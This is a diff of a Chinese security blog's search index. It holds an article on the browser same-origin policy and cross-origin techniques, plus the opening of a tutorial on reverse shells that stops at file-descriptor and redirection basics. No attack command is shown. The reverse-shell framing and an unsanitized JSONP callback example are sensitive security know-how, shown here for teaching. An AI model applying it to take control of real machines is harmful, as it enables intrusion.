+<p>server.com上remote.html，监听<code>message</code>事件，并检查来源是否是要通信的域。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span>(e.origin !== <span class="string">&#x27;http://localhost:8088&#x27;</span>) <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">            alert(e.data.msg+<span class="string">&quot; from &quot;</span>+e.origin);</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="7、片段标识符"><a href="#7、片段标识符" class="headerlink" title="7、片段标识符"></a>7、片段标识符</h3><ul>
+<li>原理：片段标识符（fragment identifier）指的是，URL的<code>#</code>号后面的部分，比如<code>http://example.com/x.html#fragment</code>的<code>#fragment</code>。如果只是改变片段标识符，页面不会重新刷新。</li>
+</ul>
+<p>父窗口可以把信息，写入子窗口的片段标识符。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> src = originURL + <span class="string">&#x27;#&#x27;</span> + data;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;myIFrame&#x27;</span>).src = src;</span><br></pre></td></tr></table></figure>
+<p>子窗口通过监听<code>hashchange</code>事件得到通知。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onhashchange = checkMessage;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkMessage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> message = <span class="built_in">window</span>.location.hash;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>同样的，子窗口也可以改变父窗口的片段标识符。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">parent.location.href= target + <span class="string">&quot;#&quot;</span> + hash;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="内容安全策略（CSP）"><a href="#内容安全策略（CSP）" class="headerlink" title="内容安全策略（CSP）"></a>内容安全策略（CSP）</h2><p>CSP的主要目标是减少和报告XSS攻击. XSS攻击利用浏览器对从服务器接受的内容的信任。恶意的脚本在受害的浏览器被执行, 因为浏览器相信内容源，甚至当内容源并不是从它应该来的地方过来的。</p>
+<p>CSP使服务器管理员能够通过制定浏览器能够执行的可信赖脚本的域名来减少或者消除由XSS可能出现的矢量。 一个兼容CSP的浏览器将只会执行加载与白名单域名的源文件的脚本，忽略那些其他的脚本（包括内联脚本和事件操控HTML属性）</p>
+<p>具体内容可以看：<a class="link"   href="http://www.ruanyifeng.com/blog/2016/09/csp.html" >Content Security Policy 入门教程<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://lightless.me/archives/review-SOP.html" >再谈同源策略<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://xz.aliyun.com/t/224" >跨域方法总结<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" >浏览器同源政策及其规避方法<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>同源策略</tag>
+      </tags>
   </entry>
   <entry>
     <title>命令注入总结</title>
@@ -1205,397 +1730,6 @@
       </categories>
       <tags>
         <tag>命令注入/执行</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>同源策略</title>
-    <url>/2021/03/13/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</url>
-    <content><![CDATA[<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p><strong>同源策略</strong>是一个重要的安全策略，它用于限制一个<a class="link"   href="https://developer.mozilla.org/en-US/docs/Glossary/Origin" >origin<i class="fas fa-external-link-alt"></i></a>的文档或者它加载的脚本如何能与另一个源的资源进行交互。它能帮助阻隔恶意文档，减少可能被攻击的媒介。</p>
-<h2 id="源的定义"><a href="#源的定义" class="headerlink" title="源的定义"></a>源的定义</h2><p>如果两个URL拥有相同的<strong>协议（http、https）、端口和主机</strong>，那么这两个URL就是同源的。</p>
-<p>example：</p>
-<table>
-<thead>
-<tr>
-<th>URL</th>
-<th>是否同源</th>
-<th>原因</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><a class="link"   href="http://store.company.com/dir/page.html" >http://store.company.com/dir/page.html<i class="fas fa-external-link-alt"></i></a></td>
-<td>base</td>
-<td></td>
-</tr>
-<tr>
-<td><a class="link"   href="http://store.company.com/dir2/other.html" >http://store.company.com/dir2/other.html<i class="fas fa-external-link-alt"></i></a></td>
-<td>同源</td>
-<td>只有路径不同</td>
-</tr>
-<tr>
-<td><a class="link"   href="http://store.company.com/dir/inner/another.html" >http://store.company.com/dir/inner/another.html<i class="fas fa-external-link-alt"></i></a></td>
-<td>同源</td>
-<td>只有路径不同</td>
-</tr>
-<tr>
-<td><a class="link"   href="https://store.company.com/secure.html" >https://store.company.com/secure.html<i class="fas fa-external-link-alt"></i></a></td>
-<td>不同源</td>
-<td>协议不同</td>
-</tr>
-<tr>
-<td><a class="link"   href="http://store.company.com:81/dir/etc.html" >http://store.company.com:81/dir/etc.html<i class="fas fa-external-link-alt"></i></a></td>
-<td>不同源</td>
-<td>端口不同</td>
-</tr>
-<tr>
-<td><a class="link"   href="http://news.company.com/dir/other.html" >http://news.company.com/dir/other.html<i class="fas fa-external-link-alt"></i></a></td>
-<td>不同源</td>
-<td>主机不同</td>
-</tr>
-</tbody></table>
-<p>对于<code>about:blank</code>和<code>javascript:</code>这种特殊的 URL，他们的源应当是继承自加载他们的页面的源，他们本身并没有『源』的概念。</p>
-<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。</p>
-<p>设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。如果其他网站可以读取A网站的 Cookie，会发生什么？</p>
-<p>很显然，如果 Cookie 包含隐私（比如存款总额），这些信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p>
-<p>由此可见，”同源政策”是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。</p>
-<h3 id="限制范围"><a href="#限制范围" class="headerlink" title="限制范围"></a>限制范围</h3><p>同源策略限制非同源的三种行为：</p>
-<ul>
-<li><p>Cookie、LocalStorage 和 IndexDB 无法读取。</p>
-</li>
-<li><p>DOM 无法获得。</p>
-</li>
-<li><p>AJAX 请求不能发送。</p>
-</li>
-</ul>
-<h2 id="跨源访问"><a href="#跨源访问" class="headerlink" title="跨源访问"></a>跨源访问</h2><p>我们已经知道了，浏览器会根据同源策略允许或拒绝加载某些资源，但是又一个问题由此而生，我们的网站通常会将静态文件（<code>CSS</code>,<code>JS</code>, 图片）等放置在 CDN 上，那么 CDN 与当前域必然是不同源的，但是神奇的是，这些网站可以正常加载出他们需要的资源并展示给用户，这里为什么又不受同源策略的影响呢？</p>
-<p>同源策略控制不同源之间的交互，例如在使用<code>XMLHttpRequest</code> 或<code>&lt;img&gt;</code>标签时则会受到同源策略的约束。这些交互通常分为三类：</p>
-<ul>
-<li><p>跨域<strong>写操作</strong>（Cross-origin writes）一般是被允许的。例如链接（links），重定向以及表单提交。</p>
-</li>
-<li><p>跨域<strong>资源嵌入</strong>（Cross-origin embedding）一般是被允许。</p>
-</li>
-<li><p>跨域<strong>读操作</strong>（Cross-origin reads）一般是<strong>不被允许的</strong>，但常可以通过内嵌资源来巧妙的进行读取访问。</p>
-</li>
-</ul>
-<p>以下是可能嵌入跨源的资源的一些示例：</p>
-<ul>
-<li><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。</li>
-<li><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code> 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的Content-Type 消息头。</li>
-<li><code>&lt;img&gt;</code> / <code>&lt;video&gt;</code> / <code>&lt;audio&gt;</code> 嵌入多媒体资源。</li>
-<li><code>&lt;object&gt;</code> <code>&lt;embed&gt;</code> 和 <code>&lt;applet&gt;</code> 的插件。</li>
-<li><code>@font-face</code> 引入的字体。一些浏览器允许跨域字体( cross-origin fonts)，一些需要同源字体(same-origin fonts)。</li>
-<li><code>&lt;frame&gt;</code> 和 <code>&lt;iframe&gt;</code> 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。</li>
-</ul>
-<h3 id="1、具备src的标签"><a href="#1、具备src的标签" class="headerlink" title="1、具备src的标签"></a>1、具备src的标签</h3><ul>
-<li>原理：所有具有<code>src</code>属性的HTML标签都是可以跨域的</li>
-</ul>
-<p>在浏览器中，<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>和<code>&lt;link&gt;</code>这几个标签是可以加载跨域（非同源）的资源的，并且加载的方式其实相当于一次普通的GET请求，唯一不同的是，为了安全起见，浏览器不允许这种方式下对加载到的资源的读写操作，而只能使用标签本身应当具备的能力（比如脚本执行、样式应用等等）。</p>
-<h3 id="2、JSONP跨域"><a href="#2、JSONP跨域" class="headerlink" title="2、JSONP跨域"></a>2、JSONP跨域</h3><ul>
-<li>原理：<code>&lt;script&gt;</code>是可以跨域的，而且在跨域脚本中可以直接回调当前脚本的函数</li>
-</ul>
-<p><code>&lt;script&gt;</code>标签是可以加载异域的JavaScript并执行的，通过预先设定好的<strong>callback</strong>函数来实现和母页面的交互。它有一个大名，叫做JSONP跨域，JSONP是JSON with Padding的略称。它是一个非官方的协议，明明是加载script，为啥和JSON扯上关系呢？原来就是这个callback函数，对它的使用有一个典型的方式，就是通过JSON来传参，即将JSON数据填充进回调函数，这就是JSONP的JSON+Padding的含义。JSONP只支持GET请求。</p>
-<p>a网站的前端代码：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">dosomething</span>(<span class="params">jsondata</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//处理获得的json数据</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://haorooms.com/data.php?callback=dosomething&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>b网站的后台代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];<span class="comment">//得到回调函数名</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);<span class="comment">//要返回的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&#x27;(&#x27;</span>.json_encode(<span class="variable">$data</span>).<span class="string">&#x27;)&#x27;</span>;<span class="comment">//输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>JSONP也存在一些安全问题，例如当对传入/传回参数没有做校验就直接执行返回的时候，会造成XSS问题。没有做Referer或Token校验就给出数据的时候，可能会造成数据泄露。</p>
-<h3 id="3、跨域资源共享（CORS）"><a href="#3、跨域资源共享（CORS）" class="headerlink" title="3、跨域资源共享（CORS）"></a>3、跨域资源共享（CORS）</h3><ul>
-<li>原理：服务器设置Access-Control-Allow-Origin HTTP响应头之后，浏览器将会允许跨域请求</li>
-</ul>
-<p>CORS是HTML5标准提出的跨域资源共享(Cross Origin Resource Share)，支持GET、POST等所有HTTP请求。CORS需要服务器端设置<code>Access-Control-Allow-Origin</code>头，否则浏览器会因为安全策略拦截返回的信息。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *              # 允许所有域名访问，或者</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;a.com   # 只允许所有域名访问</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="4、document-domain"><a href="#4、document-domain" class="headerlink" title="4、document.domain"></a>4、document.domain</h3><ul>
-<li>原理：相同主域名不同子域名下的页面，可以设置document.domain让它们同域</li>
-</ul>
-<p>我们只需要在跨域的两个页面中设置document.domain就可以了。修改document.domain的方法只适用于不同子域的框架间的交互，要载入iframe页面。</p>
-<p>example：</p>
-<ol>
-<li>在页面 <a class="link"   href="http://a.example.com/a.html" >http://a.example.com/a.html<i class="fas fa-external-link-alt"></i></a> 设置document.domain</li>
-</ol>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span> = <span class="string">&quot;iframe&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://b.example.com/b.html&quot;</span> <span class="attr">onload</span> = <span class="string">&quot;test()&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">&#x27;example.com&#x27;</span>;<span class="comment">//设置成主域</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="built_in">document</span>.getElementById(<span class="string">&#x27;￼iframe&#x27;</span>).contentWindow);</span></span><br><span class="line"><span class="javascript">        <span class="comment">//contentWindow 可取得子窗口的 window 对象</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>在页面 <a class="link"   href="http://b.example.com/b.html" >http://b.example.com/b.html<i class="fas fa-external-link-alt"></i></a> 中设置document.domain</li>
-</ol>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">&#x27;example.com&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//在iframe载入这个页面也设置document.domain，使之与主页面的document.domain相同</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="5、window-name"><a href="#5、window-name" class="headerlink" title="5、window.name"></a>5、window.name</h3><ul>
-<li>原理：window对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的。</li>
-</ul>
-<p>这里有三个页面：</p>
-<ul>
-<li>sever.com/a.html 数据存放页面</li>
-<li>agent.com/b.html 数据获取页面</li>
-<li>agent.com/c.html 空页面，做代理使用</li>
-</ul>
-<p>a.html中，设定<code>window.name</code>作为需要传递的值</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.name = <span class="string">&#x27;I was there!&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    alert(<span class="built_in">window</span>.name);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>b.html中，当iframe加载后将iframe的<code>src</code>指向同域的<code>c.html</code>，这样就可以利用<code>iframe.contentWindow.name</code>获取要传递的值了</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">  iframe = <span class="built_in">document</span>.createElement(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="javascript">  iframe.style.display = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> state = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">  iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(state === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(iframe.contentWindow.name);</span></span><br><span class="line">      alert(data);</span><br><span class="line"><span class="javascript">      iframe.contentWindow.document.write(<span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line">      iframe.contentWindow.close();</span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.body.removeChild(iframe);</span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(state === <span class="number">0</span>) &#123;</span></span><br><span class="line">      state = 1;</span><br><span class="line"><span class="javascript">      iframe.contentWindow.location = <span class="string">&#x27;http://agent.com/c.html&#x27;</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="javascript">  iframe.src = <span class="string">&#x27;http://sever.com/a.html&#x27;</span>;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="6、window-postMesage"><a href="#6、window-postMesage" class="headerlink" title="6、window.postMesage"></a>6、window.postMesage</h3><ul>
-<li>原理: HTML5新增的postMessage方法，通过postMessage来传递信息，对方可以通过监听message事件来监听信息。可跨主域名及双向跨域。</li>
-</ul>
-<p>这里有两个页面：</p>
-<ol>
-<li>agent.com/index.html</li>
-<li>server.com/remote.html</li>
-</ol>
-<p>本地代码index.html</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;proxy&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://server.com/remote.html&quot;</span> <span class="attr">onload</span> = <span class="string">&quot;postMsg()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span>  </span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> obj = &#123;  </span></span><br><span class="line"><span class="javascript">            msg: <span class="string">&#x27;hello world&#x27;</span>  </span></span><br><span class="line">        &#125;  </span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">postMsg</span> (<span class="params"></span>)</span>&#123;  </span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;proxy&#x27;</span>);  </span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> win = iframe.contentWindow;  </span></span><br><span class="line"><span class="javascript">            win.postMessage(obj,<span class="string">&#x27;http://server.com&#x27;</span>);  </span></span><br><span class="line">        &#125;  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><code>postMessage</code>的使用方法： otherWindow.postMessage(message, targetOrigin);</p>
-<ul>
-<li>otherWindow: 指目标窗口，也就是给哪个window发消息，是 window.frames 属性的成员或者由 window.open 方法创建的窗口</li>
-<li>message: 是要发送的消息，类型为 String、Object (IE8、9 不支持)</li>
-<li>targetOrigin: 是限定消息接收范围，不限制请使用 <code>*</code></li>
-</ul>
-<p>server.com上remote.html，监听<code>message</code>事件，并检查来源是否是要通信的域。</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span>(e.origin !== <span class="string">&#x27;http://localhost:8088&#x27;</span>) <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">            alert(e.data.msg+<span class="string">&quot; from &quot;</span>+e.origin);</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="7、片段标识符"><a href="#7、片段标识符" class="headerlink" title="7、片段标识符"></a>7、片段标识符</h3><ul>
-<li>原理：片段标识符（fragment identifier）指的是，URL的<code>#</code>号后面的部分，比如<code>http://example.com/x.html#fragment</code>的<code>#fragment</code>。如果只是改变片段标识符，页面不会重新刷新。</li>
-</ul>
-<p>父窗口可以把信息，写入子窗口的片段标识符。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> src = originURL + <span class="string">&#x27;#&#x27;</span> + data;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;myIFrame&#x27;</span>).src = src;</span><br></pre></td></tr></table></figure>
-<p>子窗口通过监听<code>hashchange</code>事件得到通知。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onhashchange = checkMessage;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkMessage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> message = <span class="built_in">window</span>.location.hash;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>同样的，子窗口也可以改变父窗口的片段标识符。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">parent.location.href= target + <span class="string">&quot;#&quot;</span> + hash;</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="内容安全策略（CSP）"><a href="#内容安全策略（CSP）" class="headerlink" title="内容安全策略（CSP）"></a>内容安全策略（CSP）</h2><p>CSP的主要目标是减少和报告XSS攻击. XSS攻击利用浏览器对从服务器接受的内容的信任。恶意的脚本在受害的浏览器被执行, 因为浏览器相信内容源，甚至当内容源并不是从它应该来的地方过来的。</p>
-<p>CSP使服务器管理员能够通过制定浏览器能够执行的可信赖脚本的域名来减少或者消除由XSS可能出现的矢量。 一个兼容CSP的浏览器将只会执行加载与白名单域名的源文件的脚本，忽略那些其他的脚本（包括内联脚本和事件操控HTML属性）</p>
-<p>具体内容可以看：<a class="link"   href="http://www.ruanyifeng.com/blog/2016/09/csp.html" >Content Security Policy 入门教程<i class="fas fa-external-link-alt"></i></a></p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://lightless.me/archives/review-SOP.html" >再谈同源策略<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://xz.aliyun.com/t/224" >跨域方法总结<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" >浏览器同源政策及其规避方法<i class="fas fa-external-link-alt"></i></a></p>
-]]></content>
-      <categories>
-        <category>安全</category>
-      </categories>
-      <tags>
-        <tag>同源策略</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>反弹shell</title>
-    <url>/2021/03/29/%E5%8F%8D%E5%BC%B9shell/</url>
-    <content><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>​    在介绍反弹链接的时候先说明什么是正向链接：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。而反弹shell是指攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。本质上是网络概念的客户端与服务端的角色反转。<strong>反弹shell简单来说就是通过命令让靶机的shell的控制权交到攻击者的机器中</strong>。</p>
-<p>可能有人会问：我们都能够在靶机上直接执行命令了，为什么还反弹shell呢？这里有几种情况：</p>
-<ol>
-<li><p>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
-</li>
-<li><p>它的ip会动态改变，你不能持续控制。</p>
-</li>
-<li><p>由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
-</li>
-<li><p>靶机执行的命令结果没有回显，无法直接获知运行的状态。</p>
-</li>
-</ol>
-<p>这些情况都可以通过反弹shell来解决。</p>
-<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>想反弹shell只需要一行或者几行命令，但是这里面涉及到的东西日常比较少用，需要大概了解一下才能弄明白这些命令到底做了什么东西。</p>
-<h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><blockquote>
-<p>Linux 系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件，所有执行I/O操作的系统调用都会通过文件描述符。</p>
-</blockquote>
-<p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
-<table>
-<thead>
-<tr>
-<th>描述符</th>
-<th>用途</th>
-<th>stdio流</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0</td>
-<td>标准输入</td>
-<td>stdin</td>
-</tr>
-<tr>
-<td>1</td>
-<td>标准输出</td>
-<td>stdout</td>
-</tr>
-<tr>
-<td>2</td>
-<td>标准错误</td>
-<td>stderr</td>
-</tr>
-</tbody></table>
-<p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p>
-<p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>
-<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p>
-<ol>
-<li>输入重定向 <code>&lt;</code>、<code> &lt;&lt;</code></li>
-<li>输出重定向 <code>&gt;</code> 、<code>&gt;&gt;</code></li>
-</ol>
-<p><strong>重点</strong>：</p>
-<ol>
-<li><p>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</p>
-</li>
-<li><p>如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p>
-</li>
-<li><p><code>&lt;</code> 是对标准输入 0 重定向 ，<code>&gt;</code> 是对标准输出 1 重定向</p>
-</li>
-<li><p><strong>再强调一下，重定向就是针对文件描述符的操作</strong></p>
-</li>
-</ol>
-<h4 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h4><p>格式：（注意[n]与&lt;之间没有空格）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&lt;word	</span><br></pre></td></tr></table></figure>
-<p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果 n 省略就是0（标准输入）</p>
-<p>example:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat 0&lt;file</span></span><br><span class="line">hello wordl</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat &lt;file</span></span><br><span class="line">hello wordl</span><br></pre></td></tr></table></figure>
